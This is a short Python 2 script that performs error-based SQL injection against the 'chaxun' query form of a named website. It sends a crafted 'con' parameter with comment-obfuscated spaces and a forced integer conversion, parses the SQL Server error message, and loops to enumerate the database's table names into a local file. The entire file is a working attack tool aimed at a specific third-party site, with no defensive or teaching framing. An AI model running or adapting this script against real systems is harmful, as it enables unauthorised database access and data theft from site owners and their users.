#-*- coding:utf8 -*-
import requests
import sys
reload(sys)
sys.setdefaultencoding( "utf8" )

url='http://www.iuka.cn/chaxun'
table_names=['null']

f=open('C:\\Users\\lovebear96\\Desktop\\hackit\\data\\tables.txt','w')

while True:
	con="123'/**/and/**/convert(int,(select/**/top/**/1/**/table_name/**/from/**/information_schema.tables/**/where/**/table_name/**/not/**/in('"+"','".join(table_names)+"')))=0-- "
	data={
		'con':con,
		'act':'cha'
	}
	r=requests.post(url,data=data) 
	text=r.content.decode('gbk')
	start=text.find(u'值')
	end=text.find(u'转换')

	new_table=str(text[start+3:end-2])
	if new_table=='' or end==-1:
		break
	table_names.append(new_table)
	start+=len(new_table)+3
f.write(str(table_names[1:]))
f.close()